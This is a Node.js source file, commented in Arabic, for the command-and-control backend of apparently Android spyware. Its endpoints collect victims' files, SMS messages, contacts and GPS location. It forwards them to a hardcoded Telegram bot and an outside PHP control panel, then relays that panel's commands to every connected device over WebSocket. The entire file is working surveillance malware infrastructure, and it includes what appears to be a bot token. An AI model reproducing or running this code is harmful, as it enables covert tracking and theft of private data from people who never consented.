const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

// --- إعدادات واهم @KHAIN3 ---
const token = '74149AAHOJ33aC-iJe5v7-B6f9JInwZAV9NpZnHY';
const id = '724940';
const PANEL_URL = 'https://wahm.pro/bot/control.php'; // رابط لوحتك

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// دالة تمرير البيانات للوحة التحكم PHP
async function forwardToPanel(data, isFile = false) {
    try {
        if (isFile) {
            const form = new FormData();
            form.append('file', data.buffer, { filename: data.name });
            form.append('model', data.model);
            await axios.post(PANEL_URL, form, { headers: { ...form.getHeaders() } });
        } else {
            const params = new URLSearchParams();
            params.append('model', data.model);
            params.append('text', data.text);
            await axios.post(PANEL_URL, params);
        }
    } catch (e) { console.log("خطأ في التمرير للوحة"); }
}

app.get('/', (req, res) => {
    res.send('<h1 align="center">تم الربط بنجاح بين التليجرام ولوحة الويب - المطور واهم</h1>');
});

// استقبال الصور والملفات
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const model = req.headers.model || "Unknown";

    // 1. إرسال للتليجرام
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• ملف من <b>${model}</b>`,
        parse_mode: "HTML"
    }, { filename: name });

    // 2. إرسال للوحة التحكم PHP
    forwardToPanel({ buffer: req.file.buffer, name: name, model: model }, true);

    res.send('OK');
});

// استقبال الرسائل النصية (SMS/Contacts)
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || "Unknown";
    const text = req.body['text'];

    // 1. إرسال للتليجرام
    appBot.sendMessage(id, `°• رسالة من <b>${model}</b>\n\n${text}`, { parse_mode: "HTML" });

    // 2. إرسال للوحة التحكم PHP
    forwardToPanel({ model: model, text: text });

    res.send('OK');
});

// استقبال الموقع
app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || "Unknown";
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    forwardToPanel({ model: model, text: `الموقع الإحداثي: ${req.body['lat']}, ${req.body['lon']}` });
    res.send('OK');
});

// إدارة الاتصالات
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || "Unknown";
    ws.uuid = uuid;
    appClients.set(uuid, { model: model });

    appBot.sendMessage(id, `°• جهاز متصل: ${model}`);
    
    ws.on('close', () => {
        appBot.sendMessage(id, `°• فقد الاتصال: ${model}`);
        appClients.delete(uuid);
    });
});

// سحب الأوامر من لوحة التحكم (PHP) وتمريرها للسوكيت
setInterval(async () => {
    try {
        const response = await axios.get(`${PANEL_URL}?get_cmd=1`);
        const cmd = response.data.trim();
        if (cmd && cmd !== "OK") {
            appSocket.clients.forEach(client => {
                if (client.readyState === webSocket.OPEN) {
                    client.send(cmd);
                }
            });
        }
    } catch (e) {}
}, 3000);

// نظام التنبيه المستمر (Ping)
setInterval(() => {
    appSocket.clients.forEach(ws => ws.send('ping'));
}, 5000);

appServer.listen(process.env.PORT || 8999);

